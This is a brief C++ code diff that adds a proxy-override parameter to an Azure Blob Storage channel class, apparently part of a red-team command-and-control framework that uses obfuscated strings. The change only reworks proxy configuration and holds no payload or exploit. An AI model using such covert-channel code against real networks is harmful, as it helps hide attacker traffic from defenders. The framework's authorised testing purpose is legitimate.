@@ -23,11 +23,9 @@ namespace
 	}
 }
 
-FSecure::AzureBlobStorage::AzureBlobStorage(std::string const& sasToken, std::string const& storageAccountName, std::string const& containerName, std::string const& channelName)
+FSecure::AzureBlobStorage::AzureBlobStorage(std::string const& sasToken, std::string const& storageAccountName, std::string const& containerName, std::string const& channelName, std::string const& proxyOverride)
 {
-	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
-		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);
-
+	this->m_ProxyConfig = WebProxy::GetProxyConfigurationOverride(proxyOverride);
 	this->m_sasToken = sasToken;
 	this->m_storageAccountName = storageAccountName;
 	this->m_containerName = containerName;
